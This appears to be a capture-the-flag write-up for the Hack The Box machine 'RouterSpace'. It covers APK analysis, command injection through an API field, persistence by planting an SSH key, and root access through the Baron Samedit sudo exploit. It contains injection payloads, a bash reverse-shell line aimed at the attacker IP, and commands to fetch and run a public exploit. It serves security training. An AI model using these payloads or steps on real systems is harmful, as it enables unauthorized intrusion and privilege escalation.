10:T43c2,<p><strong>Difficulty:</strong> Easy<br><strong>OS:</strong> Linux<br><strong>IP:</strong> 10.129.227.47<br><strong>Attacker IP:</strong> 10.10.16.84  </p>
<hr>



<h2 id="attack-chain">Attack chain</h2>
<p>RouterSpace repeats a simple loop:</p>
<pre><code>Enumerate → Find Attack Surface → Exploit → Enumerate Again → Escalate
</code></pre>
<p>Each result defines the next check. Re-enumerate after access changes because new services, files, and privileges may become visible.</p>
<p>Follow the evidence rather than assumptions.</p>
<hr>
<h2 id="step-1-reconnaissance">Step 1: Reconnaissance</h2>

<pre><code class="language-bash" data-language="bash">nmap -p- --min-rate 10000 10.129.227.47
</code></pre>
<h3 id="why-this-command">Why this command</h3>
<ul>
<li><code>-p-</code> scans <strong>all 65535 ports</strong>, not just the top 1000. Services can run on non-standard ports - missing one means missing an attack vector.</li>
<li><code>--min-rate 10000</code> speeds up the scan. On HTB labs (controlled environments) this is safe. On real engagements you would slow this down to avoid detection.</li>
</ul>
<h3 id="what-we-found">What we found</h3>
<pre><code>22/tcp open  ssh
80/tcp open  http
</code></pre>

<p>Two ports means a small attack surface. SSH (22) is almost never the entry point - brute-forcing SSH is loud and usually fruitless without credentials. HTTP (80) is the interesting one. <strong>Web applications are almost always where you start.</strong></p>
<p>Port 22 gets mentally filed away as: <em>"useful later once I have credentials or a key."</em></p>
<hr>
<h2 id="step-2-web-enumeration">Step 2: Web Enumeration</h2>

<p>First, add the hostname to <code>/etc/hosts</code> so the machine resolves by name:</p>
<pre><code class="language-bash" data-language="bash">echo "10.129.227.47 routerspace.htb" | sudo tee -a /etc/hosts
</code></pre>
<h3 id="why-add-a-hostname">Why add a hostname</h3>
<p>Many web apps behave differently depending on the <code>Host</code> header in HTTP requests. Virtual hosting means the server may only show you the right content if you use the correct domain name. add <code>&lt;ip&gt; &lt;boxname&gt;.htb</code> as a habit.</p>
<h3 id="browse-to-the-site">Browse to the site</h3>
<p>Visit <code>http://routerspace.htb</code> in a browser.</p>
<p>You find a simple marketing page for a router management app. The only interactive element is a <strong>Download</strong> button that gives you <code>RouterSpace.apk</code>.</p>
<h3 id="what-we-download">What we download</h3>
<pre><code class="language-bash" data-language="bash">wget http://routerspace.htb/RouterSpace.apk -P /home/kali/Downloads/htb/
</code></pre>

<p>When a website offers a downloadable file - especially an app - <strong>download it immediately.</strong> Apps are useful sources: they contain API endpoints, hardcoded credentials, encryption keys, and business logic. This is your primary lead.</p>
<p>Directory brute-forcing this site returns nothing useful (the server returns 200 for everything, making it noisy). The APK is the real attack surface.</p>
<hr>
<h2 id="step-3-apk-analysis-static">Step 3: APK Analysis (Static)</h2>
<h3 id="what-is-an-apk">What is an APK</h3>
<p>An APK (Android Package) is essentially a zip file containing:</p>
<ul>
<li>Compiled Java/Kotlin bytecode (<code>.dex</code> files)</li>
<li>Resources (images, layouts, strings)</li>
<li>A manifest file describing the app</li>
<li>Any bundled JavaScript (for React Native apps)</li>
</ul>
<h3 id="unpacking-the-apk">Unpacking the APK</h3>
<pre><code class="language-bash" data-language="bash">apktool d RouterSpace.apk
</code></pre>
<p>This decompiles the APK into human-readable form. You get directories like <code>smali/</code> (disassembled bytecode), <code>assets/</code>, and <code>AndroidManifest.xml</code>.</p>
<h3 id="what-to-look-for">What to look for</h3>
<p><strong>AndroidManifest.xml</strong> - tells you what the app does, what permissions it needs, and what components it has.</p>
<p><strong>Assets/index.android.bundle</strong> - if it's a React Native app, all the JavaScript logic lives here. This includes API calls, endpoints, and sometimes credentials.</p>
<h3 id="key-findings">Key findings</h3>
<ul>
<li>The app is built with <strong>React Native</strong> (JavaScript running on Android)</li>
<li>The certificate in <code>original/META-INF/CERT.RSA</code> contains the string <code>routerspace.htb</code> : confirms our hostname guess</li>
<li>The JavaScript bundle (though obfuscated) reveals the app makes POST requests to <code>/api/v4/monitoring/router/dev/check/deviceAccess</code></li>
</ul>

<p>You do NOT need a working Android emulator to hack this. That's a trap beginners fall into - spending hours setting up Genymotion or Android Studio. <strong>The goal is to understand what the app sends to the server, then replicate it yourself with curl.</strong> Static analysis gets you the endpoint and headers without ever running the app.</p>
<hr>
<h2 id="step-4-testing-the-api-endpoint">Step 4: Testing the API Endpoint</h2>
<h3 id="what-we-know-so-far">What we know so far</h3>
<p>From static analysis:</p>
<ul>
<li>Endpoint: <code>POST /api/v4/monitoring/router/dev/check/deviceAccess</code></li>
<li>The app sends JSON with an <code>ip</code> field</li>
<li>The <code>User-Agent</code> must be <code>RouterSpaceAgent</code> (the server rejects other values)</li>
</ul>
<h3 id="test-the-endpoint">Test the endpoint</h3>
<pre><code class="language-bash" data-language="bash">curl -s \
  -H 'User-Agent: RouterSpaceAgent' \
  -H 'Content-Type: application/json' \
  -d '{"ip":"0.0.0.0"}' \
  http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess
</code></pre>
<h3 id="response">Response</h3>
<pre><code>"0.0.0.0\n"
</code></pre>
<h3 id="what-this-tells-us">What this tells us</h3>
<p>The server is <strong>echoing our input back</strong>. This is a strong hint. When a server takes user input, does <em>something</em> with it server-side, and returns a result - it's almost certainly passing that input to a system command or function. </p>
<p>The question becomes: <em>what is the server doing with this IP?</em> Possibilities:</p>
<ul>
<li>Running <code>ping &lt;ip&gt;</code></li>
<li>Running <code>traceroute &lt;ip&gt;</code></li>
<li>Passing it to some custom shell script</li>
</ul>
<p>Any of these would be vulnerable to <strong>command injection</strong> if the input isn't sanitized.</p>

<p>Whenever you see "input goes in, result comes out," think: <em>what process is handling this?</em> If there's a shell involved anywhere in that chain, you can inject commands. The echo behavior is a dead giveaway that the server is processing your string in a shell context.</p>
<hr>
<h2 id="step-5-command-injection">Step 5: Command Injection</h2>
<h3 id="what-is-command-injection">What is command injection</h3>
<p>When a web application passes user-controlled input directly to a system shell command without sanitization, you can terminate the intended command and append your own. For example, if the server runs:</p>
<pre><code class="language-bash" data-language="bash">ping -c 1 &lt;user_input&gt;
</code></pre>
<p>And you supply <code>0.0.0.0; id</code>, the shell interprets this as:</p>
<pre><code class="language-bash" data-language="bash">ping -c 1 0.0.0.0; id
</code></pre>
<p>The <code>;</code> ends the <code>ping</code> command and starts a new one (<code>id</code>), which runs as whatever user the web server process belongs to.</p>
<h3 id="test-it">Test it</h3>
<pre><code class="language-bash" data-language="bash">curl -s \
  -H 'User-Agent: RouterSpaceAgent' \
  -H 'Content-Type: application/json' \
  -d '{"ip":"0.0.0.0; id"}' \
  http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess
</code></pre>
<h3 id="response-2">Response</h3>
<pre><code>"0.0.0.0\nuid=1001(paul) gid=1001(paul) groups=1001(paul)\n"
</code></pre>
<p><strong>We have Remote Code Execution (RCE) as user <code>paul</code>.</strong></p>
<h3 id="why-not-get-a-reverse-shell">Why not get a reverse shell</h3>
<p>The machine has an outbound firewall - it blocks connections from the target back to us. A classic bash reverse shell like <code>bash -i &gt;&amp; /dev/tcp/10.10.16.84/4444 0&gt;&amp;1</code> just hangs.</p>
<p>This is common on HTB and real environments. <strong>When you can't get a shell back, pivot to writing files instead.</strong> We have RCE - we can read and write files on the server. That's enough to plant an SSH key.</p>

<p>Firewalls block outbound. But the <em>server</em> can still accept inbound SSH connections on port 22 (that's what it's there for). Instead of making the server call us, we make ourselves able to log in as paul via SSH. Plant our public key → connect legitimately.</p>
<hr>
<h2 id="step-6-getting-a-shell-as-paul">Step 6: Getting a Shell as paul</h2>
<h3 id="how-ssh-key-authentication-works">How SSH key authentication works</h3>
<p>SSH supports two login methods:</p>
<ol>
<li><strong>Password</strong> : you type a password</li>
<li><strong>Key pair</strong> : you have a private key locally, and the server has your public key in <code>~/.ssh/authorized_keys</code></li>
</ol>
<p>If the server finds your public key in <code>authorized_keys</code>, it grants access without a password. We can <em>write</em> our public key there using our RCE.</p>
<h3 id="generate-an-ssh-key-pair-on-kali">Generate an SSH key pair on Kali</h3>
<pre><code class="language-bash" data-language="bash">ssh-keygen -t ed25519 -f /home/kali/.ssh/routerspace -N ""
</code></pre>
<ul>
<li><code>-t ed25519</code> : modern, fast elliptic curve key type</li>
<li><code>-f</code> : file path to save the key</li>
<li><code>-N ""</code> : no passphrase (empty, for convenience)</li>
</ul>
<p>This creates two files:</p>
<ul>
<li><code>/home/kali/.ssh/routerspace</code> : your <strong>private key</strong> (never share this)</li>
<li><code>/home/kali/.ssh/routerspace.pub</code> : your <strong>public key</strong> (safe to share/plant)</li>
</ul>
<h3 id="plant-the-public-key-via-rce">Plant the public key via RCE</h3>
<pre><code class="language-bash" data-language="bash">curl -s \
  -H 'User-Agent: RouterSpaceAgent' \
  -H 'Content-Type: application/json' \
  -d "{\"ip\":\"0.0.0.0; mkdir -p /home/paul/.ssh &amp;&amp; echo '$(cat /home/kali/.ssh/routerspace.pub)' &gt;&gt; /home/paul/.ssh/authorized_keys\"}" \
  http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess
</code></pre>
<p>Breaking down the injected command:</p>
<ul>
<li><code>mkdir -p /home/paul/.ssh</code> : create the <code>.ssh</code> directory if it doesn't exist (<code>-p</code> suppresses errors if it already exists)</li>
<li><code>&amp;&amp;</code> : only run the next command if the previous succeeded</li>
<li><code>echo '&lt;pubkey&gt;' &gt;&gt; authorized_keys</code> : append our public key (<code>&gt;&gt;</code> appends, <code>&gt;</code> would overwrite)</li>
</ul>
<h3 id="connect-via-ssh">Connect via SSH</h3>
<pre><code class="language-bash" data-language="bash">ssh -i /home/kali/.ssh/routerspace paul@routerspace.htb
</code></pre>
<p>You're in.</p>

<p>We went from "I can run commands" to "I have an interactive shell" by using what we had access to. No fancy exploit - just logic: SSH exists, we can write files, keys allow passwordless SSH login. Chain the primitives together.</p>

<h2 id="step-7-user-flag">Step 7: User Flag</h2>
<pre><code class="language-bash" data-language="bash">cat /home/paul/user.txt
</code></pre>
<pre><code>83531[redacted]735eda2222
</code></pre>

<h2 id="step-8-privilege-escalation-enumeration">Step 8: Privilege Escalation Enumeration</h2>
<h3 id="the-goal">The goal</h3>
<p>We're logged in as <code>paul</code> (a regular user). We need to become <code>root</code> to read <code>/root/root.txt</code>. This is called <strong>privilege escalation</strong>.</p>
<h3 id="what-to-check-first">What to check first</h3>
<p>Start by checking the sudo version - it's a common escalation path:</p>
<pre><code class="language-bash" data-language="bash">sudo --version
</code></pre>
<p>Or use a quick vulnerability check from the CVE-2021-3156 advisory:</p>
<pre><code class="language-bash" data-language="bash">sudoedit -s Y
</code></pre>
<ul>
<li>If it <strong>prompts for a password</strong> → vulnerable to Baron Samedit</li>
<li>If it <strong>prints usage/help</strong> → patched</li>
</ul>
<h3 id="response-3">Response</h3>
<pre><code>[sudo] password for paul:
</code></pre>
<p><strong>Vulnerable.</strong></p>

<p>Before running automated tools like LinPEAS, do quick manual checks for known critical vulns first. CVE-2021-3156 was patched in January 2021 - machines released around or before that date are often still vulnerable. The <code>sudoedit -s Y</code> one-liner is a near-instant check. Fast wins first.</p>
<hr>
<h2 id="step-9-exploiting-cve-2021-3156-baron-samedit">Step 9: Exploiting CVE-2021-3156 (Baron Samedit)</h2>
<h3 id="what-is-baron-samedit">What is Baron Samedit</h3>
<p>CVE-2021-3156 is a <strong>heap-based buffer overflow</strong> in <code>sudo</code> discovered by Qualys in January 2021. It affects sudo versions 1.8.2 through 1.8.31p2 and 1.9.0 through 1.9.5p1.</p>
<p>The vulnerability: when <code>sudoedit</code> is invoked with a trailing backslash in an argument, it incorrectly unescapes the argument, overflowing a heap buffer. Because <code>sudo</code> runs as root (it's a setuid binary), this overflow can be exploited to gain a root shell.</p>
<p>You don't need to understand the heap exploitation internals - you just need to know:</p>
<ol>
<li>It exists</li>
<li>The target is vulnerable</li>
<li>There's a public PoC</li>
</ol>
<h3 id="on-kali-download-the-exploit">On Kali: download the exploit</h3>
<pre><code class="language-bash" data-language="bash">cd /tmp
wget https://codeload.github.com/blasty/CVE-2021-3156/zip/main -O CVE-2021-3156.zip
unzip CVE-2021-3156.zip
</code></pre>
<h3 id="transfer-to-the-target">Transfer to the target</h3>
<p>Because outbound connections are blocked, we use SCP (which goes <em>inbound</em> from Kali to the target over port 22 - allowed):</p>
<pre><code class="language-bash" data-language="bash">scp -i /home/kali/.ssh/routerspace -r /tmp/CVE-2021-3156-main paul@routerspace.htb:/tmp/
</code></pre>
<h3 id="on-the-target-compile-and-run">On the target: compile and run</h3>
<pre><code class="language-bash" data-language="bash">cd /tmp/CVE-2021-3156-main
make
./sudo-hax-me-a-sandwich 1
</code></pre>
<p>The <code>1</code> selects the target profile: <strong>Ubuntu 20.04.1 (Focal Fossa), sudo 1.8.31, libc-2.31</strong>.</p>
<p>The exploit prints its progress and drops you into a root shell:</p>
<pre><code>** CVE-2021-3156 PoC by blasty &lt;peter@haxx.in&gt;

using target: Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
** pray for your rootshell.. **
[+] bl1ng bl1ng! We got it!
# id
uid=0(root) gid=0(root) groups=0(root),1001(paul)
</code></pre>
<h3 id="why-index-1-specifically">Why index 1 specifically</h3>
<p>The exploit targets specific memory offsets that vary by sudo version and libc version. The PoC ships with a list of pre-computed targets. You identify which one matches by checking the OS and sudo version on the target (<code>lsb_release -a</code>, <code>sudo --version</code>). Ubuntu 20.04 with sudo 1.8.31 is index 1 in blasty's list.</p>

<p>Public PoCs exist for well-known CVEs. The skill isn't writing the exploit from scratch - it's: (1) identifying the vulnerability, (2) finding the right PoC, (3) matching the target profile correctly. Getting the target index wrong means a crash instead of a shell.</p>

<h2 id="lessons-learned">Lessons Learned</h2>
<h3 id="1-you-don-t-always-need-to-run-the-app">1. You don't always need to run the app</h3>
<p>The APK was a red herring in terms of setup complexity. Static analysis (reading the decompiled source) gave us everything we needed. The "dynamic analysis with Android emulator" path works, but it's slow and painful. try the simple path first.</p>
<h3 id="2-firewalls-don-t-stop-you-they-redirect-you">2. Firewalls don't stop you: they redirect you</h3>
<p>An outbound firewall kills reverse shells. But if inbound SSH is open and you have file write, you still win. Think about what channels ARE available, not just the ones that are blocked.</p>
<h3 id="3-check-sudo-version-early">3. Check sudo version early</h3>
<p>Baron Samedit affected many of systems. It's one of the first things worth checking on any Linux target from 2021 or earlier. A 5-second check (<code>sudoedit -s Y</code>) can save you hours of enumeration.</p>
<h3 id="4-chain-primitives">4. Chain primitives</h3>
<ul>
<li>RCE → file write → SSH key → interactive shell</li>
<li>Interactive shell → version check → public exploit → root</li>
</ul>
<p>Neither jump was a single magic step. Each primitive enabled the next one. This chaining is the core skill of post-exploitation.</p>
